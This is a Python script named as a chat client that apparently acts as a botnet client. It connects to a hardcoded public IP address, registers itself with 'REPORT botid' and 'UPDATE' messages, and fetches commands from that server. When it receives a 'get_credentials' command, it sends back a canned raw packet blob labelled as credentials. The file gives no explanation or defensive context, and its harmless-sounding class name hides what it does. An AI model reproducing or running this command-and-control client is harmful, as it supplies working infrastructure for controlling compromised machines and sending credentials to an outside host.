import socket
import threading


def send(conn, msg):
    try:
        print(b"OUT: " + msg.encode('utf-8'))
        conn.sendall(msg.encode('utf-8'))
        return True
    except socket.error:
        return False


def receive(conn, size):
    try:
        data = conn.recv(size)
        if not data:
            return False
        else:
            while b'<END>' not in data:
                data += conn.recv(size)
                if not data:
                    break
            print(b"IN:  " + data)
            print("")
            return data.decode("utf-8")
    except socket.error as e:
        return False

#1cf6726f53
class ChatClient:
    def __init__(self):
        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.__pullThread = threading.Thread(target=self.__pull)
        self.__pullThread.setDaemon(True)

        self.Quit = False
        self.__Wait = 0
        self.__Command = ""

        self.name = ""

    def start(self):
        self.__socket.connect(('18.195.107.195', 5376))
        self.__pullThread.start()

        send(self.__socket, "REPORT botid= os= <END>\t")
        self.__Wait = 1
        while self.__Wait > 0:
            pass
        send(self.__socket, "UPDATE version=1 <END>\t")
        self.__Wait = 1
        while self.__Wait > 0:
            pass
        send(self.__socket, "COMMAND <END>\t")
        self.__Wait = 1
        while self.__Wait > 0:
            pass

        to_send = "\xb0\xbe\x76\xc9\x8d\xd8\x9c\xb6\xd0\xc6\xce\xd5\x08\x00\x45\x00\x00\x9d\xc5\xaa\x40\x00\x40\x06\x34\xd5\xc0\xa8\x00\xad\x12\xc3\x6b\xc3\xb4\x58\x15\x00\x16\x18\x1a\x16\x5a\xf8\xc3\x68\x80\x18\x01\xf6\x40\x6b\x00\x00\x01\x01\x08\x0a\xfe\xb3\x3f\xc8\xd0\x9c\xfa\xaa\x94\x60\xc8\xd8\x68\x5b\x72\xc2\x4e\x7b\x6d\xa7\x18\xe5\x8a\x08\x66\x50\x22\x5b\x73\x8d\x81\xa6\xb9\x7c\x5b\x06\x5f\x6a\x63\x73\x4b\x66\xee\xee\x7e\xf4\xe8\xa8\xa4\x5c\x1a\x2e\xa9\x30\x96\x17\x29\xe2\x45\xc9\x58\x93\xce\xd0\xd9\x85\xd1\xfb\x22\x22\x09\xdf\x91\xa4\x58\x1b\x87\x0b\x16\xbb\x39\x1f\xed\x87\x5b\x74\xe7\x0c\x37\x84\x47\xbb\xbd\xf3\x2a\x8e\x72\x08\x81\x45\x8f\xdf\x39\xe2\x82\x19\x20\x3c\x45\x4e\x44\x3e\x0a"
        to_send1 = "\xb0\xbe\x76\xc9\x8d\xd8\x9c\xb6\xd0\xc6\xce\xd5\x08\x00\x45\x00\x00\x9d\xc5\xaa\x40\x00\x40\x06\x34\xd5\xc0\xa8\x00\xad\x12\xc3\x6b\xc3\xb4\x58\x15\x00\x16\x18\x1a\x16\x5a\xf8\xc3\x68\x80\x18\x01\xf6\x40\x6b\x00\x00\x01\x01\x08\x0a\xfe\xb3\x3f\xc8\xd0\x9c\xfa\xaa\x94\x60\xc8\xd8\x68\x5b\x72\xc2\x4e\x7b\x6d\xa7\x18\xe5\x8a\x08\x66\x50\x22\x5b\x73\x8d\x81\xa6\xb9\x7c\x5b\x06\x5f\x6a\x63\x73\x4b\x66\xee\xee\x7e\xf4\xe8\xa8\xa4\x5c\x1a\x2e\xa9\x30\x96\x17\x29\xe2\x45\xc9\x58\x93\xce\xd0\xd9\x85\xd1\xfb\x22\x22\x09\xdf\x91\xa4\x58\x1b\x87\x0b\x16\xbb\x39\x1f\xed\x87\x5b\x74\xe7\x0c\x37\x84\x47\xbb\xbd\xf3\x2a\x8e\x72\x08\x81\x45\x8f\xdf\x39\xe2\x82\x19\x20\x3c\x45\x4e\x44\x3e\x00"

        self.__Wait = 1
        if self.__Command == "get_credentials":
            send(self.__socket, to_send1)
            send(self.__socket, "DONE <END>\t")
            self.__Wait = 1
            while self.__Wait > 0:
                pass
        self.Quit = True

    def __pull(self):
        while True and not self.Quit:
            res = receive(self.__socket, 4096)
            if res:
                self.__Command = res.split()[1]
                self.__Wait -= 1
            else:
                print("ERR")
        self.close()

    def close(self, code=0):
        self.__socket.close()
        exit(code)


if __name__ == '__main__':
    chatClient = ChatClient()
    chatClient.start()
    while True and not chatClient.Quit:
        pass
